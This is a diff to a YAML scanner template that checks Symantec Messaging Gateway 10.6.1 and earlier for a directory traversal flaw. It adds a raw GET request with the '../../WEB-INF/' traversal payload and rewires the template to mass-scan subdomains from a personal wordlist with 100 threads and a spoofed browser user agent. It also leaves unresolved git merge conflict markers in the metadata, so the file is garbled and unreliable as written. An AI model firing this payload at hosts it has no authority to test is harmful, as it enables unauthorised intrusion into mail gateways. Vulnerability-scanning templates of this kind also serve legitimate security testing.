@@ -3,6 +3,7 @@ id: symantec-messaging-gateway
 info:
   name: Symantec Messaging Gateway <=10.6.1 - Local File Inclusion
   author: Random_Robbie
+<<<<<<< HEAD
   severity: high
   description: Symantec Messaging Gateway 10.6.1 and prior are vulnerable to local file inclusion.
   classification:
@@ -10,12 +11,23 @@ info:
     cvss-score: 7.5
     cwe-id: CWE-22
   tags: lfi,messaging,symantec
+=======
+  severity: medium
+  description: Symantec Messaging Gateway <= 10.6.1 Directory Traversal
+  tags: lfi
+>>>>>>> 18ddf72b (add new stuff)
 
 requests:
-  - method: GET
-    path:
-      - "{{BaseURL}}/brightmail/servlet/com.ve.kavachart.servlet.ChartStream?sn=../../WEB-INF/"
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
 
+    raw:
+      - |
+        GET /brightmail/servlet/com.ve.kavachart.servlet.ChartStream?sn=../../WEB-INF/ HTTP/1.1
+        Host: {{Subdomains}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
     matchers-condition: and
     matchers:
       - type: word
